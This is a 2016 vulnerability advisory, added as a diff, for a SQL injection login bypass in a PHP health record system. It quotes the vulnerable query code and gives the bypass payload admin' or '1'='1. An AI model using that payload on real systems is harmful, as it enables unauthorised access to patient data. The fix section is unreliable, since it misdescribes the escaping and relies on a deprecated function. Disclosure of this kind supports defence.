@@ -1,0 +1,54 @@
+# Exploit Title.............. Health Record System Auth Bypass
+# Google Dork................ N/A
+# Date....................... 14/10/2016
+# Exploit Author............. lahilote
+# Vendor Homepage............ http://www.sourcecodester.com/node/10430
+# Software Link.............. http://www.sourcecodester.com/sites/default/files/download/Jesutoyeboluwatife/vital.zip
+# Version.................... 0.1
+# Tested on.................. xampp
+# CVE........................ N/A
+
+
+The audit_list in vital/signin.php
+-------------------------------
+
+----snip----
+
+if (isset($_POST['submit'])){
+	$lga_id=$_POST['lgaid'];
+$pw=$_POST['pwd'];
+$_SESSION['username'] = $lga_id;
+	
+	
+	 $sql=mysql_query("SELECT * FROM admin WHERE lga_id='$lga_id' AND password='$pw' ");
+
+----snip----
+
+You can login with username and password: admin' or '1'='1
+
+
+How to fix
+----------
+One of the method's to fix and secure such Auth Bypass flaw's, is to use the php function mysql_real_escape_string.
+It causes that every of this characters \x00, \n, \r, \, '
+get's replaced with a simple Backslash „/“, so the attackers commands become useless.
+
+   Example:
+
+if (isset($_POST['submit'])){
+	$lga_id=mysql_real_escape_string($_POST['lgaid']);
+$pw=mysql_real_escape_string($_POST['pwd']);
+$_SESSION['username'] = $lga_id;
+	
+	
+	 $sql=mysql_query("SELECT * FROM admin WHERE lga_id='$lga_id' AND password='$pw' ");
+
+
+Credits
+-------
+This vulnerability was discovered and researched by lahilote
+
+References
+----------
+http://www.sourcecodester.com/node/10430
+http://php.net/manual/en/function.mysql-real-escape-string.php
